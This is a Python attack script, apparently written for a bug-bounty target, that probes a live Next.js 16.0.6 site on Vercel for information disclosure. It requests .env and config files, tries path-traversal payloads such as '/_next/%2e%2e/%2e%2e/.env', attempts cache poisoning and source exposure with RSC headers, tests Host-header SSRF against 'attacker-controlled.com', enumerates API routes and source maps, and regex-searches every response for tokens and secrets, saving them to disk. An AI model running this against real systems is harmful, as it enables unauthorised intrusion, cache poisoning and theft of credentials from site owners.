#!/usr/bin/env python3
"""
Alternative Attack Vector Testing for Next.js 16.0.6
Focus: Information disclosure without RCE
"""

import requests
import json
import re
from urllib.parse import urlencode

TARGET = "https://nextjs-cve-hackerone.vercel.app"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"
BUILD_ID = "bIW_p-jXOXL69_fsJ2_vY"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

def print_header(text):
    print("\n" + "="*70)
    print(f"  {text}")
    print("="*70)

def print_test(text):
    print(f"\n[*] {text}")

def print_success(text):
    print(f"[+] {text}")

def print_error(text):
    print(f"[-] {text}")

def print_info(text):
    print(f"[i] {text}")

def search_for_secrets(text, context="response"):
    """Search response for potential secrets or environment variables"""
    patterns = {
        'VERCEL_': r'VERCEL_[A-Z_]+',
        'API Key': r'(api[_-]?key|apikey)[\s:=]+["\']?([a-zA-Z0-9_-]+)["\']?',
        'Secret': r'(secret|password|token)[\s:=]+["\']?([a-zA-Z0-9_-]+)["\']?',
        'Environment Variable': r'process\.env\.([A-Z_]+)',
        'Base64': r'[A-Za-z0-9+/]{40,}={0,2}',
    }

    findings = []
    for name, pattern in patterns.items():
        matches = re.findall(pattern, text, re.IGNORECASE)
        if matches:
            findings.append((name, matches))

    if findings:
        print_success(f"Found potential secrets in {context}:")
        for name, matches in findings:
            print(f"    {name}: {matches[:3]}")  # Show first 3 matches

    return findings


# =========================================================================
# 1. VERCEL SPECIAL PATHS (HIGHEST PRIORITY)
# =========================================================================

def test_vercel_special_paths():
    print_header("1. Testing Vercel Special Paths (/_src, /_logs)")

    paths = [
        "/_src",
        "/_src/",
        "/_logs",
        "/_logs/",
        "/_logs/build",
        "/_src/app",
        "/_src/pages",
    ]

    for path in paths:
        print_test(f"Testing: {path}")
        try:
            response = requests.get(f"{TARGET}{path}", timeout=10)
            print_info(f"Status: {response.status_code}")
            print_info(f"Length: {len(response.text)} bytes")

            if response.status_code == 200:
                print_success(f"ACCESSIBLE! {path} returned 200")
                print_info(f"Preview: {response.text[:500]}")
                search_for_secrets(response.text, path)

                # Save full response
                with open(f"vercel_special_path_{path.replace('/', '_')}.txt", "w") as f:
                    f.write(response.text)
                print_success(f"Saved to: vercel_special_path_{path.replace('/', '_')}.txt")

            elif response.status_code == 403:
                print_info("Protected (403 Forbidden)")
            elif response.status_code == 401:
                print_info("Requires authentication (401)")
            else:
                print_info(f"Not accessible ({response.status_code})")

        except Exception as e:
            print_error(f"Error: {e}")


# =========================================================================
# 2. SOURCE MAPS
# =========================================================================

def test_source_maps():
    print_header("2. Testing Source Map Exposure")

    # Common source map paths
    source_maps = [
        f"/_next/static/chunks/main.js.map",
        f"/_next/static/chunks/webpack.js.map",
        f"/_next/static/chunks/framework.js.map",
        f"/_next/static/chunks/pages/_app.js.map",
        f"/_next/static/chunks/app/page.js.map",
        f"/_next/static/{BUILD_ID}/_buildManifest.js.map",
        f"/_next/static/{BUILD_ID}/_ssgManifest.js.map",
    ]

    # First check if any JS files reference source maps
    print_test("Checking main.js for sourceMappingURL...")
    try:
        response = requests.get(f"{TARGET}/_next/static/chunks/main.js", timeout=10)
        if "sourceMappingURL" in response.text:
            print_success("Source map reference found in main.js!")
            # Extract the source map URL
            match = re.search(r'sourceMappingURL=([^\s]+)', response.text)
            if match:
                source_map_url = match.group(1)
                print_info(f"Source map URL: {source_map_url}")
                if not source_map_url.startswith("http"):
                    source_maps.insert(0, f"/_next/static/chunks/{source_map_url}")
        else:
            print_info("No source map reference found in main.js")
    except Exception as e:
        print_error(f"Error checking main.js: {e}")

    # Try to access source maps
    for sm_path in source_maps:
        print_test(f"Testing: {sm_path}")
        try:
            response = requests.get(f"{TARGET}{sm_path}", timeout=10)
            print_info(f"Status: {response.status_code}")

            if response.status_code == 200:
                print_success(f"SOURCE MAP ACCESSIBLE! {sm_path}")

                # Parse source map
                try:
                    sm_data = json.loads(response.text)
                    print_info(f"Source map version: {sm_data.get('version')}")
                    print_info(f"Sources: {len(sm_data.get('sources', []))} files")

                    # Check for sensitive sources
                    sources = sm_data.get('sources', [])
                    for src in sources:
                        if any(keyword in src.lower() for keyword in ['env', 'config', 'secret', 'key', 'auth']):
                            print_success(f"Interesting source: {src}")

                    # Check sourcesContent for secrets
                    sources_content = sm_data.get('sourcesContent', [])
                    if sources_content:
                        print_info(f"Has sourcesContent: {len(sources_content)} files")
                        full_source = '\n'.join(str(s) for s in sources_content if s)
                        search_for_secrets(full_source, "source map content")

                        # Save source map
                        filename = f"source_map_{sm_path.split('/')[-1]}"
                        with open(filename, "w") as f:
                            json.dump(sm_data, f, indent=2)
                        print_success(f"Saved source map to: {filename}")

                except json.JSONDecodeError:
                    print_error("Failed to parse source map as JSON")
                    print_info(f"Preview: {response.text[:200]}")

        except Exception as e:
            print_error(f"Error: {e}")


# =========================================================================
# 3. CVE-2025-55183 (Source Code Exposure)
# =========================================================================

def test_cve_2025_55183():
    print_header("3. Testing CVE-2025-55183 (Source Code Exposure)")

    print_test("Requesting with RSC Accept header...")

    headers = {
        'Accept': 'text/x-component',
        'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        'Next-Router-Prefetch': '1',
        'RSC': '1',
    }

    try:
        response = requests.get(TARGET, headers=headers, timeout=10)
        print_info(f"Status: {response.status_code}")
        print_info(f"Content-Type: {response.headers.get('content-type')}")
        print_info(f"Length: {len(response.text)} bytes")
        print_info(f"Preview: {response.text[:500]}")

        # Check if we got RSC payload
        if response.text.startswith(('1:', '0:', 'S', 'M')):
            print_success("Received RSC payload!")
            search_for_secrets(response.text, "RSC payload")

            # Save response
            with open("rsc_response.txt", "w") as f:
                f.write(response.text)
            print_success("Saved to: rsc_response.txt")
        else:
            print_info("Received HTML response (not RSC payload)")

    except Exception as e:
        print_error(f"Error: {e}")


# =========================================================================
# 4. API ROUTE ENUMERATION
# =========================================================================

def test_api_routes():
    print_header("4. Testing API Route Enumeration")

    api_routes = [
        "/api/env",
        "/api/config",
        "/api/debug",
        "/api/health",
        "/api/status",
        "/api/info",
        "/api/version",
        "/api/graphql",
        "/api/hello",
        "/api/test",
        "/api/webhook",
        "/api/server-action",
        "/api/trpc",
        "/api/metadata",
        "/api/deployment",
    ]

    for route in api_routes:
        print_test(f"Testing: {route}")
        try:
            response = requests.get(f"{TARGET}{route}", timeout=10)
            print_info(f"Status: {response.status_code}")

            if response.status_code == 200:
                print_success(f"API route exists: {route}")
                print_info(f"Content-Type: {response.headers.get('content-type')}")
                print_info(f"Preview: {response.text[:300]}")
                search_for_secrets(response.text, route)

                # Try with different methods
                for method in ['POST', 'PUT', 'DELETE', 'OPTIONS']:
                    try:
                        resp = requests.request(method, f"{TARGET}{route}", timeout=5)
                        if resp.status_code not in [404, 405]:
                            print_info(f"  {method}: {resp.status_code}")
                    except:
                        pass

            elif response.status_code == 405:
                print_info("Exists but wrong method (405)")
                # Try POST
                try:
                    resp = requests.post(f"{TARGET}{route}", timeout=5)
                    print_info(f"  POST: {resp.status_code}")
                    if resp.status_code == 200:
                        print_info(f"  Response: {resp.text[:200]}")
                except:
                    pass

        except Exception as e:
            print_error(f"Error: {e}")


# =========================================================================
# 5. CACHE POISONING (CVE-2025-49005)
# =========================================================================

def test_cache_poisoning():
    print_header("5. Testing Cache Poisoning (CVE-2025-49005)")

    print_test("Step 1: Attempting to poison cache with RSC payload...")

    headers = {
        'Accept': 'text/x-component',
        'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
        'Next-Router-Prefetch': '1',
        'RSC': '1',
    }

    try:
        # Send poisoning request
        response1 = requests.get(TARGET, headers=headers, timeout=10)
        print_info(f"Poisoning request status: {response1.status_code}")
        print_info(f"Response starts with: {response1.text[:50]}")

        print_test("Step 2: Checking if cache was poisoned (normal request)...")

        # Send normal request
        response2 = requests.get(TARGET, timeout=10)
        print_info(f"Normal request status: {response2.status_code}")
        print_info(f"Response starts with: {response2.text[:50]}")

        # Check if we got RSC payload in normal response
        if response2.text.startswith(('1:', '0:', 'S', 'M')) and 'html' not in response2.text[:100].lower():
            print_success("CACHE POISONED! Normal request returned RSC payload!")
            print_info(f"Full response: {response2.text[:500]}")
            search_for_secrets(response2.text, "poisoned cache")

            with open("cache_poisoned_response.txt", "w") as f:
                f.write(response2.text)
            print_success("Saved to: cache_poisoned_response.txt")
        else:
            print_info("Cache not poisoned (normal HTML response)")

    except Exception as e:
        print_error(f"Error: {e}")


# =========================================================================
# 6. BUILD ARTIFACTS
# =========================================================================

def test_build_artifacts():
    print_header("6. Testing Build Artifact Access")

    artifacts = [
        f"/_next/static/{BUILD_ID}/_buildManifest.js",
        f"/_next/static/{BUILD_ID}/_middlewareManifest.js",
        f"/_next/static/{BUILD_ID}/_ssgManifest.js",
        f"/_next/static/{BUILD_ID}/_app-build-manifest.json",
        "/next.config.js",
        "/package.json",
        "/vercel.json",
        "/.env",
        "/.env.local",
        "/.env.production",
        "/.next/cache/",
        "/.next/server/",
        "/.vercel/output/",
    ]

    for artifact in artifacts:
        print_test(f"Testing: {artifact}")
        try:
            response = requests.get(f"{TARGET}{artifact}", timeout=10)
            print_info(f"Status: {response.status_code}")

            if response.status_code == 200:
                print_success(f"Artifact accessible: {artifact}")
                print_info(f"Length: {len(response.text)} bytes")
                print_info(f"Preview: {response.text[:300]}")
                search_for_secrets(response.text, artifact)

                # Save if JSON or JS
                if artifact.endswith(('.json', '.js')):
                    filename = f"artifact_{artifact.split('/')[-1]}"
                    with open(filename, "w") as f:
                        f.write(response.text)
                    print_success(f"Saved to: {filename}")

        except Exception as e:
            print_error(f"Error: {e}")


# =========================================================================
# 7. PATH TRAVERSAL
# =========================================================================

def test_path_traversal():
    print_header("7. Testing Path Traversal")

    traversal_paths = [
        "/_next/../../.env",
        "/_next/../../.env.local",
        "/_next/../../.env.production",
        "/_next/../next.config.js",
        "/_next/../package.json",
        "/_next/../vercel.json",
        "/static/../../.env",
        "/_next/%2e%2e/%2e%2e/.env",
        "/_next/..%2f..%2f.env",
        "/_next/..;/..;/.env",
    ]

    for path in traversal_paths:
        print_test(f"Testing: {path}")
        try:
            response = requests.get(f"{TARGET}{path}", timeout=10)
            print_info(f"Status: {response.status_code}")

            if response.status_code == 200 and len(response.text) > 0:
                print_success(f"Path traversal successful: {path}")
                print_info(f"Response: {response.text[:300]}")
                search_for_secrets(response.text, path)

        except Exception as e:
            print_error(f"Error: {e}")


# =========================================================================
# 8. SSRF TESTING
# =========================================================================

def test_ssrf():
    print_header("8. Testing SSRF in Server Actions")

    print_test("Testing Host header manipulation...")

    headers = {
        'Host': 'attacker-controlled.com',
        'Next-Action': ACTION_ID,
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary',
    }

    body = '------WebKitFormBoundary\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += '[]\r\n'
    body += '------WebKitFormBoundary--\r\n'

    try:
        response = requests.post(TARGET, headers=headers, data=body, timeout=10)
        print_info(f"Status: {response.status_code}")
        print_info(f"Response: {response.text[:300]}")

        # Check for SSRF indicators
        if 'attacker-controlled.com' in response.text:
            print_success("Possible SSRF - Host header reflected!")

    except Exception as e:
        print_error(f"Error: {e}")


# =========================================================================
# 9. RESPONSE HEADER ANALYSIS
# =========================================================================

def test_response_headers():
    print_header("9. Analyzing Response Headers")

    try:
        response = requests.get(TARGET, timeout=10)

        print_info("All headers:")
        for key, value in response.headers.items():
            print(f"  {key}: {value}")

        # Look for interesting headers
        interesting = ['x-vercel', 'x-next', 'server', 'x-powered-by', 'x-deployment']

        print_test("Interesting headers:")
        for key, value in response.headers.items():
            if any(i in key.lower() for i in interesting):
                print_success(f"{key}: {value}")

    except Exception as e:
        print_error(f"Error: {e}")


# =========================================================================
# 10. ROBOTS.TXT AND SITEMAP
# =========================================================================

def test_robots_sitemap():
    print_header("10. Testing robots.txt and sitemap.xml")

    files = [
        "/robots.txt",
        "/sitemap.xml",
        "/sitemap.txt",
        "/sitemap_index.xml",
    ]

    for file in files:
        print_test(f"Testing: {file}")
        try:
            response = requests.get(f"{TARGET}{file}", timeout=10)
            print_info(f"Status: {response.status_code}")

            if response.status_code == 200:
                print_success(f"File exists: {file}")
                print_info(f"Content:\n{response.text}")

        except Exception as e:
            print_error(f"Error: {e}")


# =========================================================================
# MAIN EXECUTION
# =========================================================================

def main():
    print_header("Next.js 16.0.6 Alternative Attack Vector Testing")
    print_info(f"Target: {TARGET}")
    print_info(f"Webhook: {WEBHOOK}")
    print_info(f"Build ID: {BUILD_ID}")
    print_info(f"Action ID: {ACTION_ID}")

    # Test in priority order
    test_vercel_special_paths()      # CRITICAL
    test_source_maps()               # HIGH
    test_cve_2025_55183()           # HIGH
    test_api_routes()                # HIGH
    test_cache_poisoning()           # MEDIUM
    test_build_artifacts()           # MEDIUM
    test_path_traversal()            # MEDIUM
    test_ssrf()                      # MEDIUM
    test_response_headers()          # LOW
    test_robots_sitemap()            # LOW

    print_header("Testing Complete!")
    print_info("Check output files for detailed results")
    print_info("Files saved:")
    print_info("  - vercel_special_path_*.txt")
    print_info("  - source_map_*.map")
    print_info("  - rsc_response.txt")
    print_info("  - cache_poisoned_response.txt")
    print_info("  - artifact_*.json/js")

if __name__ == "__main__":
    main()
